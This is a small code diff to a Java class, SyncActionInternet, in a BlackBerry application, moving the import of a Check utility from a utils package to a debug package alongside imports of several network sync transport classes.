@@ -17,9 +17,9 @@ import blackberry.action.sync.transport.BisTransport;
 import blackberry.action.sync.transport.DirectTransport;
 import blackberry.action.sync.transport.Wap2Transport;
 import blackberry.action.sync.transport.WifiTransport;
+import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.utils.Check;
 import blackberry.utils.WChar;
 
 public class SyncActionInternet extends SyncAction {
